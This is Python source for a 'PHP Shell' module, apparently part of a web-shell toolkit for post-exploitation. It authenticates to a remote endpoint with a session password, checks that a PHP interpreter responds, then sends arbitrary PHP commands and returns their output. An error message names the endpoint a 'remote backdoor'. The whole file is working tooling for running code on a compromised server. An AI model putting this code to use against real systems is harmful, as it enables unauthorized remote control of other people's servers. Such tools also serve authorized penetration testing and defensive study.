from mako.template import Template
from core.module import Module
from core import messages
from core import utilities
from core.channels.channel import Channel
from core.loggers import log
import random


class Php(Module):

    """Execute PHP commands.

    Usage:
      shell_php <command>

    """

    def initialize(self):

        self._register_info(
            {
                'name': 'PHP Shell',
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            # Declare mandatory commands
            arguments=[
                'command'
            ],
            # Declare additional options
            options={
                'prefix_string': '',
                'post_data': '',
                'postfix_string': '',
            })

        self.channel = Channel(
            self.session['url'],
            self.session['password'])

    def setup(self, args={}):
        """Basic check if some PHP remote interpreter is working.

        Args:
            args: The dictionary of arguments

        Returns:
            Returns true or false if the module is enable or not.

        """

        enabled = True
        rand = str(random.randint(11111, 99999))

        command = 'echo(%s);' % rand
        response, code = self.channel.send(command)

        if rand != response:
            enabled = False

        # If the response is wrong, warn about the
        # error code
        self._print_response_status(command, code, response)

        log.debug('PHP check: %s' % enabled)

        return enabled

    def run(self, args):
        """ Run module """

        cwd = self._get_stored_result('cwd', module = 'file_cd', default = '.')
        chdir = '' if cwd == '.' else "chdir('%s');" % cwd

        # Compose command with cwd, pre_command, and post_command option.
        command = Template("${chdir}${args['prefix_string']}${args['command']}${args['postfix_string']}").render(
          chdir = chdir, args=args
        )

        # Send command
        response, code = self.channel.send(command)

        # If the response is empty, warn about the error code
        self._print_response_status(command, code, response)

        # Strip last newline if present
        return response[:-1] if (
            response and response.endswith('\n')
            ) else response

    def _print_response_status(self, command, code, response):

        """
        Debug print and warning in case of missing response and HTTP errors
        """

#        log.debug(
#           utilities.shorten_string(
#               command,
#               keep_header = 40,
#               keep_trailer = 40
#           )
#        )

        log.debug(command)

        if response: return

        if code == 404:
            log.warn(messages.module_shell_php.error_404_remote_backdoor)
        elif code == 500:
            log.warn(messages.module_shell_php.error_500_executing)
        elif code != 200:
            log.warn(messages.module_shell_php.error_i_executing % code)

        command_last_chars = utilities.shorten_string(command.rstrip(),
                                                    keep_trailer = 10)

        if (command_last_chars and
              command_last_chars[-1] not in ( ';', '}' )):
            log.warn(messages.module_shell_php.missing_php_trailer_s % command_last_chars)
